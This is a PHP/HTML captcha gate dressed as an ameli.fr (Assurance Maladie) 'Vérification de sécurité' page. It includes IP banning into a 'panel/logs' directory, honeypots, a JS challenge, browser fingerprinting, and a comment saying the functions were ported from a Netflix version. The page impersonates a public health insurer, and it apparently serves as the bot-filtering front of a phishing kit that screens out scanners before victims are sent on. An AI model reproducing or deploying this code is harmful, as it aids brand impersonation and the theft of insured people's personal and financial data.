<?php
if (!isset($captcha_enabled)) $captcha_enabled = false;
if (!$captcha_enabled) return;

// Déjà validé → continuer
if (!empty($_SESSION['captcha_passed'])) return;

// URL de retour : priorité à la session, sinon même URL
$_cpt_return = !empty($_SESSION['captcha_return'])
    ? $_SESSION['captcha_return']
    : strtok($_SERVER['REQUEST_URI'] ?? '/', '?');

// ── Fonctions sécurité (portées depuis Netflix) ───────────────

function getUserIP() {
    $ip_keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($ip_keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            return trim(end($ipList));
        }
    }
    return 'UNKNOWN';
}

function banIP_ameli($ip, $reason) {
    $banned_ips_file = __DIR__ . '/panel/logs/ip_ban.txt';
    $ban_log         = __DIR__ . '/panel/logs/captcha_ban.log';
    @file_put_contents($banned_ips_file, $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
    @file_put_contents($ban_log, sprintf("[%s] IP: %s | Reason: %s\n", date('Y-m-d H:i:s'), $ip, $reason), FILE_APPEND | LOCK_EX);
    session_unset();
    session_destroy();
    http_response_code(403);
    exit;
}

function checkRateLimit_ameli($ip) {
    $rate_file    = __DIR__ . '/panel/logs/captcha_attempts.json';
    $max_attempts = 3;
    $time_window  = 60;
    if (!file_exists($rate_file)) {
        @file_put_contents($rate_file, json_encode([]), LOCK_EX);
    }
    $attempts     = json_decode(@file_get_contents($rate_file), true) ?: [];
    $current_time = time();
    if (isset($attempts[$ip])) {
        $attempts[$ip] = array_filter($attempts[$ip], function($ts) use ($current_time, $time_window) {
            return ($current_time - $ts) < $time_window;
        });
    } else {
        $attempts[$ip] = [];
    }
    if (count($attempts[$ip]) >= $max_attempts) {
        banIP_ameli($ip, "Trop de tentatives captcha");
    }
    $attempts[$ip][] = $current_time;
    @file_put_contents($rate_file, json_encode($attempts), LOCK_EX);
}

$ip              = getUserIP();
$banned_ips_file = __DIR__ . '/panel/logs/ip_ban.txt';
$message         = "";

// Vérifier si l'IP est bannie
if (file_exists($banned_ips_file)) {
    $banned_ips = file($banned_ips_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $banned_ips, true)) {
        session_unset();
        session_destroy();
        http_response_code(403);
        exit;
    }
}

// ── Traitement POST ───────────────────────────────────────────

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    checkRateLimit_ameli($ip);

    // Honeypot
    if (!empty($_POST['website']) || !empty($_POST['email_confirm'])) {
        banIP_ameli($ip, "Honeypot rempli");
    }

    // Token CSRF
    if (!isset($_POST['captcha_token'], $_SESSION['captcha_token']) || $_POST['captcha_token'] !== $_SESSION['captcha_token']) {
        banIP_ameli($ip, "Token CSRF invalide");
    }

    // Temps de réponse minimum
    $captcha_start_time = $_SESSION['captcha_start_time'] ?? time();
    $response_time      = time() - $captcha_start_time;
    if ($response_time < 2) {
        banIP_ameli($ip, "Réponse trop rapide ({$response_time}s)");
    }

    if ($response_time > 300) {
        $message = "La session a expiré. Veuillez réessayer.";
    } else {
        // Challenge JavaScript (logger sans bannir)
        $jsChallengeValid = true;
        if (!isset($_POST['js_challenge']) || $_POST['js_challenge'] !== $_SESSION['js_challenge_answer']) {
            error_log("Captcha Ameli: Challenge JS échoué pour IP: $ip");
            $jsChallengeValid = false;
        }

        // Browser fingerprint (logger sans bannir)
        if (!isset($_POST['browser_fp']) || empty($_POST['browser_fp'])) {
            error_log("Captcha Ameli: Empreinte navigateur manquante pour IP: $ip");
        }

        // Validation du captcha mathématique
        if (isset($_POST['jCaptcha'])) {
            $reponse         = (int) $_POST['jCaptcha'];
            $resultat_attendu = $_SESSION['captcha_resultat'] ?? null;

            if ($resultat_attendu !== null && $reponse === $resultat_attendu) {
                if (!$jsChallengeValid) {
                    error_log("Captcha Ameli: JS échoué mais captcha correct pour IP: $ip — Autorisation accordée");
                }

                $_SESSION['captcha_passed'] = true;
                $_SESSION['bot']            = false;
                $_SESSION['captcha_ip']     = $ip;

                unset($_SESSION['captcha_resultat'], $_SESSION['captcha_token'],
                      $_SESSION['captcha_start_time'], $_SESSION['js_challenge_answer'],
                      $_SESSION['captcha_return']);

                if (session_status() === PHP_SESSION_ACTIVE) session_write_close();

                header('Location: ' . $_cpt_return);
                exit;
            } else {
                $message = "Code incorrect. Veuillez réessayer.";
            }
        } else {
            $message = "Veuillez renseigner le code affiché.";
        }
    }
}

// ── Générer les données du captcha ────────────────────────────

$csrf_token = bin2hex(random_bytes(32));
$_SESSION['captcha_token']      = $csrf_token;
$_SESSION['captcha_start_time'] = time();

$js_challenge_value               = rand(100, 999);
$_SESSION['js_challenge_answer']  = hash('sha256', $js_challenge_value . 'secret_salt_' . $csrf_token);

$valeur1 = rand(1, 10);
$valeur2 = rand(1, 10);
$_SESSION['captcha_resultat'] = $valeur1 + $valeur2;

$captcha_id             = uniqid('cap_', true);
$_SESSION['captcha_id'] = $captcha_id;

http_response_code(200);

// ── Logo ──────────────────────────────────────────────────────
$_logo_exts = ['png', 'jpg', 'jpeg', 'webp', 'svg'];
$_logo_src  = null;
foreach ($_logo_exts as $_ext) {
    if (file_exists(__DIR__ . '/logo.' . $_ext)) {
        $_logo_src = '/logo.' . $_ext;
        break;
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ameli.fr – Vérification de sécurité</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Helvetica Neue',Arial,sans-serif;background:#f5f6fa;min-height:100vh;display:flex;flex-direction:column}
.header{background:#fff;border-bottom:1px solid #e0e0e0;padding:0 24px;height:64px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 3px rgba(0,0,0,.06)}
.ameli-logo{display:flex;align-items:center;gap:10px;text-decoration:none}
.ameli-logo-icon{height:44px;width:auto;max-width:120px;object-fit:contain}
.ameli-logo-icon-svg{width:42px;height:42px}
.ameli-logo-text .sub{font-size:11px;font-weight:600;color:#0072b9;letter-spacing:.2px;text-transform:uppercase}
.header-right{font-size:12px;color:#888;display:flex;align-items:center;gap:5px}
.header-right svg{width:14px;height:14px;stroke:#0072b9}
.breadcrumb{background:#f0f4f8;border-bottom:1px solid #dde3ea;padding:8px 24px;font-size:12px;color:#666}
.breadcrumb a{color:#0072b9;text-decoration:none}
.breadcrumb span{margin:0 5px;color:#aaa}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 16px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.08);width:100%;max-width:480px;overflow:hidden}
.card-header{background:#0072b9;padding:20px 24px;display:flex;align-items:center;gap:12px}
.card-header svg{width:28px;height:28px;flex-shrink:0}
.card-header-title{font-size:16px;font-weight:700;color:#fff}
.card-header-sub{font-size:12px;color:rgba(255,255,255,.8);margin-top:2px}
.card-body{padding:28px 24px}
.alert-info{background:#e8f4fd;border-left:4px solid #0072b9;border-radius:4px;padding:12px 14px;font-size:13px;color:#1a5276;margin-bottom:24px;line-height:1.5}
.alert-info strong{display:block;margin-bottom:3px}
.captcha-image-wrap{text-align:center;margin-bottom:18px}
.captcha-image-wrap img{border:2px solid #0072b9;border-radius:6px;padding:10px;background:#fff;max-width:100%}
.captcha-input-row{display:flex;margin-bottom:16px}
.captcha-input{flex:1;padding:12px 16px;font-size:15px;border:2px solid #c8d6e5;border-radius:6px 0 0 6px;outline:none;transition:border-color .2s;color:#2c3e50}
.captcha-input:focus{border-color:#0072b9}
.captcha-submit{padding:0 20px;background:#0072b9;color:#fff;border:none;border-radius:0 6px 6px 0;font-size:14px;font-weight:600;cursor:pointer;transition:background .2s;display:flex;align-items:center;justify-content:center}
.captcha-submit:hover{background:#005a9e}
.captcha-submit:disabled{opacity:.5;cursor:not-allowed}
.captcha-submit svg{width:18px;height:18px;stroke:#fff;stroke-width:2.5;fill:none}
.badge-row{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:4px}
.badge-shield-sm{width:20px;height:20px}
.status-msg{font-size:12.5px;text-align:center;color:#7f8c8d;line-height:1.5}
.error-msg{font-size:13px;color:#c0392b;text-align:center;margin-bottom:14px;background:#fdf2f2;border-left:4px solid #e74c3c;border-radius:4px;padding:10px 14px}
.footer{background:#fff;border-top:1px solid #e0e0e0;padding:14px 24px;text-align:center;font-size:11px;color:#aaa}
.footer a{color:#aaa;text-decoration:none;margin:0 8px}
@media(max-width:480px){.captcha-input{font-size:14px}.card-body{padding:20px 16px}}
</style>
</head>
<body>

<div class="header">
  <a class="ameli-logo" href="#">
    <?php if ($_logo_src): ?>
      <img src="<?= htmlspecialchars($_logo_src) ?>" class="ameli-logo-icon" alt="Logo">
    <?php else: ?>
      <svg class="ameli-logo-icon-svg" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
        <rect width="120" height="120" rx="16" fill="#0072b9"/>
        <path d="M60 20 C60 20 35 30 35 55 C35 72 46 83 60 90 C74 83 85 72 85 55 C85 30 60 20 60 20Z" fill="none" stroke="#fff" stroke-width="5"/>
        <circle cx="60" cy="46" r="10" fill="#fff"/>
        <path d="M44 78 Q52 65 60 62 Q68 65 76 78" fill="#fff"/>
      </svg>
    <?php endif; ?>
    <div class="ameli-logo-text">
      <span class="sub">Assurance Maladie</span>
    </div>
  </a>
  <div class="header-right">
    <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
    Connexion sécurisée
  </div>
</div>

<div class="breadcrumb">
  <a href="#">Accueil</a><span>›</span><a href="#">Mon compte</a><span>›</span>Vérification de sécurité
</div>

<div class="main">
  <div class="card">
    <div class="card-header">
      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
      <div>
        <div class="card-header-title">Vérification de sécurité</div>
        <div class="card-header-sub">Étape obligatoire pour accéder à votre espace</div>
      </div>
    </div>
    <div class="card-body">
      <div class="alert-info">
        <strong>Pourquoi cette vérification ?</strong>
        Afin de protéger votre compte et vos données personnelles, l'Assurance Maladie vérifie que vous êtes bien un utilisateur humain.
      </div>

      <?php if ($message !== ""): ?>
        <div class="error-msg"><?= htmlspecialchars($message) ?></div>
      <?php endif; ?>

      <!-- Image captcha générée dynamiquement -->
      <div class="captcha-image-wrap">
        <img src="<?= htmlspecialchars(strtok($_SERVER['REQUEST_URI'] ?? '/', '?')) ?>/../captcha_image.php?id=<?= urlencode($captcha_id) ?>" alt="Code de vérification">
      </div>

      <form method="POST" action="" id="captchaForm">
        <!-- Champ de réponse + bouton -->
        <div class="captcha-input-row">
          <input
            class="captcha-input"
            type="tel"
            name="jCaptcha"
            id="jCaptcha"
            placeholder="Saisissez le résultat…"
            required
            autocomplete="off"
            maxlength="3"
          >
          <button class="captcha-submit" type="submit" id="submitBtn" disabled>
            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
          </button>
        </div>

        <!-- Champs cachés de sécurité -->
        <input type="hidden" name="captcha_token" value="<?= htmlspecialchars($csrf_token) ?>">
        <input type="hidden" name="js_challenge"  id="js_challenge">
        <input type="hidden" name="browser_fp"    id="browser_fp">

        <!-- Honeypots invisibles -->
        <input type="text"  name="website"       id="website"       value="" style="position:absolute;left:-9999px;width:1px;height:1px;" tabindex="-1" autocomplete="off">
        <input type="email" name="email_confirm" id="email_confirm" value="" style="position:absolute;left:-9999px;width:1px;height:1px;" tabindex="-1" autocomplete="off">
      </form>

      <div class="badge-row">
        <svg class="badge-shield-sm" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M24 4L8 10V22C8 31.9 15.2 41.1 24 44C32.8 41.1 40 31.9 40 22V10L24 4Z" fill="#e8f4fd" stroke="#0072b9" stroke-width="2"/>
          <path d="M18 24l4 4 8-8" stroke="#0072b9" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        <div class="status-msg">Vérification assurée par le système de sécurité ameli.fr</div>
      </div>
    </div>
  </div>
</div>

<div class="footer">
  <a href="#">Mentions légales</a>
  <a href="#">Politique de confidentialité</a>
  <a href="#">Accessibilité</a>
  <a href="#">Contact</a>
  <br><br>© 2025 Assurance Maladie – ameli.fr
</div>

<script>
(function () {
    const challengeValue = <?= $js_challenge_value ?>;
    const token = '<?= $csrf_token ?>';

    async function sha256(message) {
        const msgBuffer = new TextEncoder().encode(message);
        const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    }

    sha256(challengeValue + 'secret_salt_' + token).then(hash => {
        document.getElementById('js_challenge').value = hash;
    });

    function generateFingerprint() {
        const data = [
            navigator.userAgent, navigator.language,
            screen.width + 'x' + screen.height, screen.colorDepth,
            new Date().getTimezoneOffset(),
            !!window.sessionStorage, !!window.localStorage,
            navigator.hardwareConcurrency || 'unknown', navigator.platform
        ].join('|');
        let hash = 0;
        for (let i = 0; i < data.length; i++) {
            const char = data.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(36);
    }

    document.getElementById('browser_fp').value = generateFingerprint();

    // Vérification côté client : minimum 2 secondes
    const formStartTime = Date.now();
    document.getElementById('captchaForm').addEventListener('submit', function (e) {
        const elapsed = (Date.now() - formStartTime) / 1000;
        if (elapsed < 2) {
            e.preventDefault();
            alert('Veuillez patienter quelques secondes avant de valider.');
            return false;
        }
    });

    // Débloquer le bouton après 2 secondes
    const btn = document.getElementById('submitBtn');
    setTimeout(function () {
        btn.disabled = false;
    }, 2000);
})();
</script>
</body>
</html>
<?php exit; ?>
